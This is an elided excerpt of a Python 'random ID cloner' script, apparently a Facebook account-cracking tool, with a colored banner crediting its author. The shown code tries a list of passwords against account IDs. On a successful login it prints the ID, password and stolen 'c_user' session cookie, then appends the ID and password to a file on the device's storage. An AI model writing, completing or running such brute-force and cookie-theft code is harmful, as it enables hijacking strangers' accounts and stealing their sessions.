...
───────────────────────
  ...
  \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mSAIMUL ISLAM SAIM   \033[1;92m|
  \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m PRIVATE             \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35Saim668           \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mRANDOM ID CLONER          \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mno team                \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36mFree               \033[1;92m|
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] TOOL NAME : {H}RANDOM')
    print(f'{M}║══[ [•] YOR IP    : ')
    print(f'{M}║══[ [•] VERSION   : {H}FREE')
    print(f'{M}╚══[ [•] TOOL NAME : {H}RANDOM\n')
    ...
    if sh =='U':
       ...
       main()
        ...
        os.system('xdg-open https://github.com/Saim668')
        main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;92m[ANISUR-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ANISUR-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
